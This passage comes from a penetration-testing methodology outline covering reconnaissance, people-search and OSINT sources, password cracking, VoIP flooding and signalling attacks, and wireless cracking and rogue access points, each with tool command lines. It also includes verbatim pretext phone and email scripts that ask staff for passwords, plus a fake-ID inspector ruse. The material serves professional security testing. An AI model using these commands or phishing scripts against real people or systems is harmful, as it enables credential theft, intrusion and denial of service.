                xwd -display 192.168.0.1:0 -root -out 192.168.0.1.xpm
            Keystrokes
                Received
                Transmitted
            Screenshots
            xhost +
        Examine Configuration Files
            /etc/Xn.hosts
            /usr/lib/X11/xdm

                Search through all files for the command "xhost +" or "/usr/bin/X11/xhost +"
            /usr/lib/X11/xdm/xsession
            /usr/lib/X11/xdm/xsession-remote
            /usr/lib/X11/xdm/xsession.0
            /usr/lib/X11/xdm/xdm-config
                DisplayManager*authorize:on
    Tor Port 9001, 9030 open
        Tor Node Checker
            Ip Pages
            Kewlio.net
        nmap NSE script
    Jet Direct 9100 open
        hijetta



Network Footprinting

    Network Footprinting (Reconnaissance) The tester would attempt to gather as much information as possible about the selected network. Reconnaissance can take two forms i.e. active and passive. A passive attack is always the best starting point as this would normally defeat intrusion detection systems and other forms of protection etc. afforded to the network. This would usually involve trying to discover publicly available information by utilising a web browser and visiting newsgroups etc. An active form would be more intrusive and may show up in audit logs and may take the form of an attempted DNS zone transfer or a social engineering type of attack.

        Whois is widely used for querying authoritative registries/ databases to discover the owner of a domain name, an IP address, or an autonomous system number of the system you are targeting.
            Authoratitive Bodies
                IANA - Internet Assigned Numbers Authority
                ICANN - Internet Corporation for Assigned Names and Numbers.
                NRO - Number Resource Organisation
                RIR - Regional Internet Registry
                    AFRINIC - African Network Information Centre
                    APNIC - Asia Pacific Network Information Centre
                        National Internet Registry
                            APJII
                            CNNIC
                            JPNIC
                            KRNIC
                            TWNIC
                            VNNIC
                    ARIN - American Registry for Internet Numbers
                    LACNIC - Latin America & Caribbean Network Information Centre
                    RIPE - Reseaux IP Européens—Network Coordination Centre
            Websites
                Central Ops
                    Domain Dossier
                    Email Dossier
                DNS Stuff
                    Online DNS one-stop shop, with the ability to perform a great deal of disparate DNS type queries.
                Fixed Orbit
                    Autonomous System lookups and other online tools available.
                Geektools
                IP2Location
                    Allows limited free IP lookups to be performed, displaying geolocation information, ISP details and other pertinent information.
                Kartoo
                    Metasearch engine that visually presents its results.
                MyIPNeighbors.com
                    Excellent site that gives you details of shared domains on the IP queried/ conversely IP to DNS resolution
                Netcraft
                    Online search tool allowing queries for host information.
                Robtex
                    Excellent website allowing DNS and AS lookups to be performed with a graphical display of the results with pointers, A, MX records and AS connectivity displayed.
                    Note: - Can be unreliable with old entries (Use CentralOps to verify)
                Traceroute.org
                    Website listing a large number links to online traceroute resources.
                Wayback Machine
                    Stores older versions of websites, making it a good comparison tool and excellent resource for previously removed data.
                Whois.net
            Tools
                Cheops-ng
                Country whois
                Domain Research Tool
                Firefox Plugins
                    AS Number
                    Shazou
                    Firecat Suite
                Gnetutil
                Goolag Scanner
                Greenwich
                Maltego
                GTWhois
                Sam Spade
                Smart whois
                SpiderFoot
        Internet Search
            General Information
                Web Investigator
                Tracesmart
                Friends Reunited
                Ebay - profiles etc.
            Financial
                EDGAR - Company information, including real-time filings. US
                Google Finance - General Finance Portal
                Hoovers - Business Intelligence, Insight and Results. US and UK
                Companies House UK
                Land Registry UK
            Phone book/ Electoral Role Information
                123people
                    http://www.123people.co.uk/s/firstname+lastname/world
                192.com
                    Electoral Role Search. UK
                411
                    Online White Pages and Yellow Pages. US

                Abika
                    Background Check, Phone Number Lookup, Trace email, Criminal record, Find People, cell phone number search, License Plate Search. US
                BT.com. UK
                    Residential
                    Business
                Pipl

                    http://pipl.com/search/?FirstName=????&LastName=????&City=&State=&Country=UK&CategoryID=2&Interface=1
                    http://pipl.com/search/?Email=john%40example.com&CategoryID=4&Interface=1
                    http://pipl.com/search/?Username=????&CategoryID=5&Interface=1
                Spokeo
                    http://www.spokeo.com/user?q=domain_name
                    http://www.spokeo.com/user?q=email_address
                Yasni
                    http://www.yasni.co.uk/index.php?action=search&search=1&sh=&name=firstname+lastname&filter=Keyword
                Zabasearch
                    People Search Engine. US
            Generic Web Searching
                Code Search
                Forum Entries
                Google Hacking Database
                Google
                    Back end files
                        .exe / .txt / .doc / .ppt / .pdf / .vbs / .pl / .sh / .bat / .sql / .xls / .mdb / .conf
                    Email Addresses
                    Contact Details
                Newsgroups/forums
                Blog Search
                    Yammer
                    Google Blog Search
                        http://blogsearch.google.com/blogsearch?hl=en&ie=UTF-8&q=????&btnG=Search+Blogs
                    Technorati
                        http://technorati.com/search/[query]?language=n
                    Jaiku
                    Present.ly
                    Twitter Network Browser
                Search Engine Comparison/ Aggregator Sites
                    Clusty
                        http://clusty.com/search?input-form=clusty-simple&v%3Asources=webplus&query=????
                    Grokker
                        http://live.grokker.com/grokker.html?query=?????&OpenSearch_Yahoo=true&Wikipedia=true&numResults=250
                    Zuula
                        http://www.zuula.com/SearchResult.jsp?bst=1&prefpg=1&st=????&x=0&y=0
                    Exalead

                        http://www.exalead.co.uk/search/results?q=????&x=0&y=0&%24mode=allweb&%24searchlanguages=en
                    Delicious
                        http://delicious.com/search?p=?????&u=&chk=&context=&fr=del_icio_us&lc=0
            Metadata Search

                Metadata can be found within various file formats. Dependant on the file types to be inspected, the more metadata can be extracted. Example metadata that can be extracted includes valid usernames, directory structures etc. make the review of documents/ images etc. relating to the target domain a valuable source of information.
                    MetaData Visualisation Sites
                        TouchGraph Google Browser
                        Kartoo
                    Tools
                        Bashitsu
                            svn checkout http://bashitsu.googlecode.com/svn/trunk/
                            cat filename | strings | bashitsu-extract-names
                        Bintext
                        Exif Tool
                            exiftool -common directory
                            exiftool -r -w .txt -common directory
                        FOCA
                            Online Version
                            Offline
                        Hachoir
                        Infocrobes
                        Libextractor
                            extract -b filename
                            extract filename
                            extract -B country_code filename
                        Metadata Extraction Tool
                            extract.bat <arg1> <arg2> <arg3>
                        Metagoofil
                            metagoofil -d target_domain -l max_no_of_files -f all ( or pdf,doc,xls,ppt) -o output_file.html -t directory_to_download_files_to
                        OOMetaExtractor
                        The Revisionist
                            ./therev '' @/directory
                            ./therev '' site.com
                            ./therev 'linux' microsoft.com en
                        Wvware
                    Wikipedia Metadata Search
                        Wikiscanner
                        Wikipedia username checker
            Social/ Business Networks

                The following sites are some of many social and business related networking entities that are in use today.  Dependant on the interests of the people you are researching it may be worth just exploring sites that they have a particular penchant based on prior knowledge from open source research, company biographies etc. i.e. Buzznet if they are interested in music/ pop culture, Flixter for movies etc.

                Finding a persons particular interests may make a potential client side attack more successful if you can find a related "hook" in any potential "spoofed" email sent for them to click on (A Spearphishing technique)

                Note: - This list is not exhaustive and has been limited to those with over 1 million members.
                    Africa
                        BlackPlanet
                    Australia
                        Bebo
                    Belgium
                        Netlog
                    Holland
                        Hyves
                    Hungary
                        iWiW
                    Iran
                        Cloob
                    Japan
                        Mixi
                    Korea
                        CyWorld
                    Poland
                        Grono
                        Nasza-klasa
                    Russia
                        Odnoklassniki
                        Vkontakte
                    Sweden
                        LunarStorm
                    UK
                        FriendsReunited et al
                        Badoo
                        FaceParty
                    US
                        Classmates
                        Facebook
                        Friendster
                        MyLife.com (formerly Reunion.com)
                        MySpace
                        Windows Live Spaces
                    Assorted
                        Buzznet
                        Care2
                        Habbo
                        Hi5
                        Linkedin
                        MocoSpace
                        Naymz
                        Orkut
                        Passado
                        Tagged
                        Twitter
                        Windows Live Spaces
                        Xanga
                        Yahoo! 360°
                        Xing
                            http://www.xing.com/app/search?op=universal&universal=????
            Resources
                OSINT
                International Directory of Search Engines
        DNS Record Retrieval from publically available servers
            Types of Information Records
                SOA Records - Indicates the server that has authority for the domain.
                MX Records - List of a host's or domain's mail exchanger server(s).
                NS Records - List of a host's or domain's name server(s).
                A Records - An address record that allows a computer name to be translated to an IP address. Each computer has to have this record for its IP address to be located via DNS.
                PTR Records - Lists a host's domain name, host identified by its IP address.
                SRV Records - Service location record.
                HINFO Records - Host information record with CPU type and operating system.
                TXT Records - Generic text record.
                CNAME - A host's canonical name allows additional names/ aliases to be used to locate a computer.
                RP - Responsible person for the domain.
            Database Settings
                Version.bind
                Serial
                Refresh
                Retry
                Expiry
                Minimum
            Sub Domains
            Internal IP ranges
                Reverse DNS for IP Range
            Zone Transfer
        Social Engineering
            Remote
                Phone
                    Scenarios
                        IT Department."Hi, it's Zoe from the helpdesk. I am doing a security audit of the networkand I need to re-synchronise the Active Directory usernames and passwords.This is so that your logon process in the morning receives no undue delays"If you are calling from a mobile number, explain that the helpdesk has beenissued a mobile phone for 'on call' personnel.
                    Results
                    Contact Details
                        Name
                        Phone number
                        Email
                        Room number
                        Department
                        Role
                Email
                    Scenarios
                        Hi there, I am currently carrying out an Active Directory Health Checkfor TARGET COMPANY and require to re-synchronise some outstandingaccounts on behalf of the IT Service Desk. Please reply to medetailing the username and password you use to logon to your desktopin the morning. I have checked with MR JOHN DOE, the IT SecurityAdvisor and he has authorised this request. I will then populate thedatabase with your account details ready for re-synchronisation withActive Directory such that replication of your account will bere-established (this process is transparent to the user and sorequires no further action from yourself). We hope that this exercisewill reduce the time it takes for some users to logon to the network.Best Regards, Andrew Marks
                        Good Morning,The IT Department had a critical failure last night regarding remote access to the corporate network, this will only affect users that occasionally work from home.If you have remote access, please email me with your username and access requirements e.g. what remote access system did you use? VPN and IP address etc, and we will reset the system. We are also using this 'opportunity' to increase the remote access users, so if you believe you need to work from home occasionally, please email me your usernames so I can add them to the correct groups.If you wish to retain your current credentials, also send your password. We do not require your password to carry out the maintainence, but it will change if you do not inform us of it.We apologise for any inconvenience this failure has caused and are working to resolve it as soon as possible. We also thank you for your continued patience and help.Kindest regards,leeEMAIL SIGNATURE
                    Software
                    Results
                    Contact Details
                        Name
                        Phone number
                        Email
                        Room number
                        Department
                        Role
                Other
            Local
                Personas
                    Name
                        Suggest same 1st name.
                    Phone
                        Give work mobile, but remember they have it!
                    Email
                        Have a suitable email address
                    Business Cards
                        Get cards printed
                Contact Details
                    Name
                    Phone number
                    Email
                    Room number
                    Department
                    Role
                Scenarios
                    New IT employee
                        New IT employee."Hi, I'm the new guy in IT and I've been told to do a quick survey of users on the network. They give all the worst jobs to the new guys don't they? Can you help me out on this?"Get the following information, try to put a "any problems with it we can help with?" slant on it.UsernameDomainRemote access (Type - Modem/VPN)Remote email (OWA)Most used software?Any comments about the network?Any additional software you would like?What do you think about the security on the network? Password complexity etc.Now give reasons as to why they have complexity for passwords, try and get someone to give you their password and explain how you can make it more secure."Thanks very much and you'll see the results on the company boards soon."
                    Fire Inspector
                        Turning up on the premise of a snap fire inspection, in line with the local government initiatives on fire safety in the workplace.Ensure you have a suitable appearance - High visibility jacket - Clipboard - ID card (fake).Check for:number of fire extinguishers, pressure, type.Fire exits, accessibility etc.Look for any information you can get. Try to get on your own, without supervision!
                Results
                Maps
                    Satalitte Imagery
                        Google Maps
                    Building layouts
                Other
        Dumpster Diving
            Rubbish Bins
            Contract Waste Removal
            Ebay ex-stock sales i.e. HDD
        Web Site copy
            htttrack
            teleport pro
            Black Widow


Password cracking

    Rainbow crack
        ophcrack
        rainbow tables
            rcrack c:\rainbowcrack\*.rt -f pwfile.txt
    Ophcrack
    Cain & Abel
    John the Ripper
        ./unshadow passwd shadow > file_to_crack
        ./john -single file_to_crack
        ./john -w=location_of_dictionary_file -rules file_to_crack
        ./john -show file_to_crack
        ./john --incremental:All file_to_crack
    fgdump
        fgdump [-t][-c][-w][-s][-r][-v][-k][-l logfile][-T threads] {{-h Host | -f filename} -u Username -p Password | -H filename} i.e. fgdump.exe -u hacker -p hard_password -c -f target.txt
    pwdump6
        pwdump [-h][-o][-u][-p] machineName
    medusa
    LCP
    L0phtcrack (Note: - This tool was aquired by Symantec from @Stake and it is there policy not to ship outside the USA and Canada
        Domain credentials
        Sniffing
        pwdump import
        sam import
    aiocracker
        aiocracker.py [md5, sha1, sha256, sha384, sha512] hash dictionary_list


VoIP Security

    Sniffing Tools
        AuthTool
        Cain & Abel
        Etherpeek
        NetDude
        Oreka
        PSIPDump
        SIPomatic
        SIPv6 Analyzer
        UCSniff
        VoiPong
        VOMIT
        Wireshark
        WIST - Web Interface for SIP Trace
    Scanning and Enumeration Tools
        enumIAX
        fping
        IAX Enumerator
        iWar
        Nessus
        Nmap
        SIP Forum Test Framework (SFTF)
        SIPcrack
        sipflanker
            python sipflanker.py 192.168.1-254
        SIP-Scan
        SIP.Tastic
        SIPVicious
        SiVuS
        SMAP
            smap IP_Address/Subnet_Mask
            smap -o IP_Address/Subnet_Mask
            smap -l IP_Address
        snmpwalk
        VLANping
        VoIPAudit
        VoIP GHDB Entries
        VoIP Voicemail Database
    Packet Creation and Flooding Tools
        H.323 Injection Files
        H225regreject
        IAXHangup
        IAXAuthJack
        IAX.Brute
        IAXFlooder
            ./iaxflood sourcename destinationname numpackets
        INVITE Flooder
            ./inviteflood interface target_user target_domain ip_address_target no_of_packets
        kphone-ddos
        RTP Flooder
        rtpbreak
        Scapy
        Seagull
        SIPBomber
        SIPNess
        SIPp
        SIPsak
            Tracing paths: - sipsak -T -s sip:usernaem@domain
            Options request:- sipsak -vv -s sip:username@domain
            Query registered bindings:- sipsak -I -C empty -a password -s sip:username@domain
        SIP-Send-Fun
        SIPVicious
        Spitter
        TFTP Brute Force
            perl tftpbrute.pl <tftpserver> <filelist> <maxprocesses>
        UDP Flooder
            ./udpflood source_ip target_destination_ip src_port dest_port no_of_packets
        UDP Flooder (with VLAN Support)
            ./udpflood source_ip target_destination_ip src_port dest_port TOS user_priority VLAN ID no_of_packets
        Voiphopper
    Fuzzing Tools
        Asteroid
        Codenomicon VoIP Fuzzers
        Fuzzy Packet
        Mu Security VoIP Fuzzing Platform
        ohrwurm RTP Fuzzer
        PROTOS H.323 Fuzzer
        PROTOS SIP Fuzzer
        SIP Forum Test Framework (SFTF)
        Sip-Proxy
        Spirent ThreatEx
    Signaling Manipulation Tools
        AuthTool
            ./authtool captured_sip_msgs_file -d dictionary -r usernames_passwords -v
        BYE Teardown
        Check Sync Phone Rebooter
        RedirectPoison
            ./redirectpoison interface target_source_ip target_source_port "<contact_information i.e. sip:100.77.50.52;line=xtrfgy>"
        Registration Adder
        Registration Eraser
        Registration Hijacker
        SIP-Kill
        SIP-Proxy-Kill
        SIP-RedirectRTP
        SipRogue
        vnak
    Media Manipulation Tools
        RTP InsertSound
            ./rtpinsertsound interface source_rtp_ip source_rtp_port destination_rtp_ip destination_rtp_port file
        RTP MixSound
            ./rtpmixsound interface source_rtp_ip source_rtp_port destination_rtp_ip destination_rtp_port file
        RTPProxy
        RTPInject
    Generic Software Suites
        OAT Office Communication Server Tool Assessment
        EnableSecurity VOIPPACK
            Note: - Add-on for Immunity Canvas
    References
        URL's
            Common Vulnerabilities and Exploits (CVE)
                Vulnerabilties and exploit information relating to these products can be found here: http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=voip
            Default Passwords
            Hacking Exposed VoIP
                Tool Pre-requisites
                    Hack Library
                    g711conversions
            VoIPsa
        White Papers
            An Analysis of Security Threats and Tools in SIP-Based VoIP Systems
            An Analysis of VoIP Security Threats and Tools
            Hacking VoIP Exposed
            Security testing of SIP implementations
            SIP Stack Fingerprinting and Stack Difference Attacks
            Two attacks against VoIP
            VoIP Attacks!
            VoIP Security Audit Program (VSAP)

Vulnerability Assessment

    Vulnerability Assessment - Utilising vulnerability scanners all discovered hosts can then be tested for vulnerabilities. The result would then be analysed to determine if there any vulnerabilities that could be exploited to gain access to a target host on a network. A number of tests carried out by these scanners are just banner grabbing/ obtaining version information, once these details are known, the version is compared with any common vulnerabilities and exploits (CVE) that have been released and reported to the user. Other tools actually use manual pen testing methods and display the output received i.e. showmount -e ip_address would display the NFS shares available to the scanner whcih would then need to be verified by the tester.
        Manual
            Patch Levels
            Confirmed Vulnerabilities
                Severe
                High
                Medium
                Low
        Automated
            Reports
            Vulnerabilities
                Severe
                High
                Medium
                Low
        Tools
            GFI
            Nessus (Linux)
                Nessus (Windows)
            NGS Typhon
            NGS Squirrel for Oracle
            NGS Squirrel for SQL
            SARA
            MatriXay
            BiDiBlah
            SSA
            Oval Interpreter
            Xscan
            Security Manager +
            Inguma
        Resources
            Security Focus
            Microsoft Security Bulletin
            Common Vulnerabilities and Exploits (CVE)
            National Vulnerability Database (NVD)
            The Open Source Vulnerability Database (OSVDB)
                Standalone Database
                    Update URL
            United States Computer Emergency Response Team (US-CERT)
            Computer Emergency Response Team
            Mozilla Security Information
            SANS
            Securiteam
            PacketStorm Security
            Security Tracker
            Secunia
            Vulnerabilities.org
            ntbugtraq
            Wireless Vulnerabilities and Exploits (WVE)
        Blogs
            Carnal0wnage
            Fsecure Blog
            g0ne blog
            GNUCitizen
            ha.ckers Blog
            Jeremiah Grossman Blog
            Metasploit
            nCircle Blogs
            pentest mokney.net
            Rational Security
            Rise Security
            Security Fix Blog
            Software Vulnerability Exploitation Blog
            Taosecurity Blog


Wireless Penetration

    Wireless Assessment. The following information should ideally be obtained/enumerated when carrying out your wireless assessment. All this information is needed to give the tester, (and hence, the customer), a clear and concise picture of the network you are assessing. A brief overview of the network during a pre-site meeting weith the customer should allow you to estimate the timescales required to carry the assessment out.
        Site Map
            RF Map
                Lines of Sight
                Signal Coverage
                    Standard Antenna
                    Directional Antenna
            Physical Map
                Triangulate APs
                Satellite Imagery
        Network Map
            MAC Filter
                Authorised MAC Addresses
                Reaction to Spoofed MAC Addresses
            Encryption Keys utilised
                WEP
                    Key Length
                        Crack Time
                        Key
                WPA/PSK
                    TKIP
                        Temporal Key Integrity Protocol, (TKIP), is an encryption protocol desgined to replace WEP
                            Key
                            Attack Time
                    AES
                        Advanced Encryption Standard (AES) is an encryption algorithm utilised for securing sensitive data.
                            Key
                            Attack Time
                802.1x
                    Derivative of 802.1x in use
            Access Points
                ESSID
                    Extended Service Set Identifier, (ESSID). Utilised on wireless networks with an access point
                        Broadcast ESSIDs
                BSSIDs
                    Basic service set identifier, (BSSID), utilised on ad-hoc wireless networks.
                        Vendor
                        Channel
                        Associations
                        Rogue AP Activity
            Wireless Clients
                MAC Addresses
                    Vendor
                    Operating System Details
                    Adhoc Mode
                    Associations
                Intercepted Traffic
                    Encrypted
                    Clear Text
    Wireless Toolkit
        Wireless Discovery
            Aerosol
            Airfart
            Aphopper
            Apradar
            BAFFLE
            karma
            Kismet
            MiniStumbler
            Netstumbler
            Wellenreiter
            Wifi Hopper
            WirelessMon
        Packet Capture
            Airopeek
            Airtraf
            Apsniff
            Cain
            Wireshark
        EAP Attack tools
            eapmd5pass
                eapmd5pass -w dictionary_file -r eapmd5-capture.dump

                eapmd5pass -w dictionary_file -U username -C EAP-MD5 Challengevalue -R EAP_MD5_Response_value -E 2 EAP-MD5 Response EAP ID Value i.e.
                -C e4:ef:ff:cf:5a:ea:44:7f:9a:dd:4f:3b:0e:f4:4d:20 -R 1f:fd:6c:46:49:bc:5d:b9:11:24:cd:02:cb:22:6d:37 -E 2
        Leap Attack Tools
            asleap
            thc leap cracker
            anwrap
        WEP/ WPA Password Attack Tools
            Aircrack-ptw
            Aircrack-ng
            Airsnort
            cowpatty
            wep attack
            wep crack
            Airbase
            wzcook
        Frame Generation Software
            Airgobbler
            airpwn
            Airsnarf
            Commview
            fake ap
            void 11
            wifi tap
                wifitap -b <BSSID> [-o <iface>] [-i <iface> [-p] [-w <WEP key> [-k <key id>]] [-d [-v]] [-h]
            FreeRADIUS - Wireless Pwnage Edition
        Mapping Software
            Knsgem
        File Format Conversion Tools
            ns1 recovery and conversion tool
            warbable
            warkizniz
                warkizniz04b.exe [kismet.csv] [kismet.gps] [ns1 filename]
            ivstools
        IDS Tools
            WIDZ
            War Scanner
            Snort-Wireless
            AirDefense
            AirMagnet
    WLAN discovery
        Unencrypted WLAN
            Visible SSID
                Sniff for IP range
                    MAC authorised
                    MAC filtering
                        Spoof valid MAC
                            Linux
                                ifconfig [interface] hw ether [MAC]
                            macchanger
                                Random Mac Address:- macchanger -r eth0
                            mac address changer for windows
                            madmacs
                            TMAC
                            SMAC
            Hidden SSID
                Deauth client
                    Aireplay-ng
                        aireplay -0 1 -a [Access Point MAC] -c [Client MAC] [interface]
                    Commview
                        Tools > Node reassociation
                    Void11
                        void11_penetration wlan0 -D -t 1 -B [MAC]
        WEP encrypted WLAN
            Visible SSID
                WEPattack
                    wepattack -f [dumpfile] -m [mode] -w [wordlist] -n [network]
                        Capture / Inject packets
                            Break WEP
                                Aircrack-ptw
                                    aircrack-ptw [pcap file]
                                Aircrack-ng
                                    aircrack -q -n [WEP key length] -b [BSSID] [pcap file]
                                Airsnort
                                    Channel > Start
                                WEPcrack
                                    perl WEPCrack.pl
                                    ./pcap-getIV.pl -b 13 -i wlan0
            Hidden SSID
                Deauth client
                    Aireplay-ng
                        aireplay -0 1 -a [Access Point MAC] -c [Client MAC] [interface]
                    Commview
                        Tools > Node reassociation
                    Void11
                        void11_hopper
                        void11_penetration [interface] -D -s [type of attack] -s [station MAC] -S [SSID] -B [BSSID]
        WPA / WPA2 encrypted WLAN
            Deauth client
                Capture EAPOL handshake
                    WPA / WPA 2 dictionary attack
                        coWPAtty
                            ./cowpatty -r [pcap file] -f [wordlist] -s [SSID]
                            ./genpmk -f dictionary_file -d hashfile_name -s ssid
                            ./cowpatty -r cature_file.cap -d hashfile_name -s ssid
                        Aircrack-ng
                            aircrack-ng -a 2 -w [wordlist] [pcap file]
        LEAP encrypted WLAN
            Deauth client
                Break LEAP
                    asleap
                        ./asleap -r data/libpcap_packet_capture_file.dump -f output_pass+hash file.dat -n output_index_filename.idx
                        ./genkeys -r dictionary_file -f output_pass+hash file.dat -n output_index_filename.idx
                    THC-LEAPcracker
                        leap-cracker -f [wordlist] -t [NT challenge response] -c [challenge]
        802.1x WLAN
            Create Rogue Access Point
                Airsnarf
                    Deauth client
                        Associate client
                            Compromise client
                                Acquire passphrase / certificate
                                    wzcook
                                    Obtain user's certificate
                fake ap
                    perl fakeap.pl --interface wlan0
                    perl fakeap.pl --interface wlan0 --channel 11 --essid fake_name --wep 1 --key [WEP KEY]
                Hotspotter
                    Deauth client
                        Associate client
                            Compromise client
                                Acquire passphrase / certificate
                                    wzcook
                                    Obtain user's certificate
                Karma
                    Deauth client
                        Associate client
                            Compromise client
                                Acquire passphrase / certificate
                                    wzcook
                                    Obtain user's certificate
                    ./bin/karma etc/karma-lan.xml
                Linux rogue AP
                    Deauth client
                        Associate client
                            Compromise client
                                Acquire passphrase / certificate
                                    wzcook
                                    Obtain user's certificate
        Resources
            URL's
                Wirelessdefence.org
                Russix
                Wardrive.net
                Wireless Vulnerabilities and Exploits (WVE)
            White Papers
                Weaknesses in the Key Scheduling Algorithm of RC4
                802.11b Firmware-Level Attacks
                Wireless Attacks from an Intrusion Detection Perspective
                Implementing a Secure Wireless Network for a Windows Environment
                Breaking 104 bit WEP in less than 60 seconds
                PEAP Shmoocon2008 Wright & Antoniewicz
                Active behavioral fingerprinting of wireless devices
            Common Vulnerabilities and Exploits (CVE)
                Vulnerabilties and exploit information relating to these products can be found here: http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=wireless


Penetration

    Penetration - An exploit usually relates to the existence of some flaw or vulnerability in an application or operating system that if used could lead to privilege escalation or denial of service against the computer system that is being attacked. Exploits can be compiled and used manually or various engines exist that are essentially at the lowest level pre-compiled point and shoot tools. These engines do also have a number of other extra underlying features for more advanced users.
        Password Attacks
            Known Accounts
                Identified Passwords
                Unidentified Hashes
            Default Accounts
                Identified Passwords
                Unidentified Hashes
        Exploits
            Successful Exploits
                Accounts
                    Passwords
                        Cracked
                        Uncracked
                    Groups
                    Other Details
                Services
                Backdoor
                Connectivity
            Unsuccessful Exploits
            Resources
                Securiteam
                    Exploits are sorted by year and must be downloaded individually
                SecurityForest
                    Updated via CVS after initial install
                GovernmentSecurity
                    Need to create and account to obtain access
                Red Base Security
                    Oracle Exploit site only
                Wireless Vulnerabilities & Exploits (WVE)
                    Wireless Exploit Site
                PacketStorm Security
                    Exploits downloadable by month and year but no indexing carried out.
                SecWatch
                    Exploits sorted by year and month, download seperately
                SecurityFocus
                    Exploits must be downloaded individually
                Metasploit
                    Install and regualrly update via svn
                Milw0rm
                    Exploit archived indexed and sorted by port download as a whole - The one to go for!
        Tools
            Metasploit
                Free Extra Modules
                    local copy
            Manual SQL Injection
                Understanding SQL Injection
                SQL Injection walkthrough
                SQL Injection by example
                Blind SQL Injection
                Advanced SQL Injection in SQL Server
                More Advanced SQL Injection
                Advanced SQL Injection in Oracle databases
                SQL Cheatsheets

                    http://ha.ckers.org/sqlinjection

                    http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/

                    http://www.0x000000.com/?i=14

                    http://pentestmonkey.net/
            SQL Power Injector
            SecurityForest
            SPI Dynamics WebInspect
            Core Impact
            Cisco Global Exploiter
            PIXDos
                perl PIXdos.pl [ --device=interface ] [--source=IP] [--dest=IP] [--sourcemac=M AC] [--destmac=MAC] [--port=n]
            CANVAS
            Inguma


